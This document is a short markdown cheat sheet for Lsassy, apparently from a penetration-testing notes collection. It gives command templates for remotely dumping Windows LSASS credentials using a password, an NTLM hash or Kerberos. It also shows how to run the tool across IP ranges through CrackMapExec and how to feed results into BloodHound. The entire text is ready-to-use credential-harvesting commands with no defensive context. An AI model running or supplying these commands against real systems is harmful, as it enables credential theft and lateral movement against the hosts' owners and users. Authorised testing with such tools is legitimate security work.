# Lsassy

## Lsassy basic usage with password (ip or range)
```
lsassy -d <domain> -u <user> -p <password> <ip>
```

## Lsassy basic usage with hash (ip or range)
```
lsassy -v -u <user> -H <hash> <ip>
```

## Lsassy basic usage with kerberos (ip or range)
```
lsassy -d <domain> -u <user> -k <ip_range>
```

## Lsassy with cme
```
cme smb <ip> --local-auth -u <user> -H <hash> -M lsassy
```

## Lsassy with cme and bloodhound
```
cme smb <ip> --local-auth -u <user> -H <hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=<neo4jpass>
```
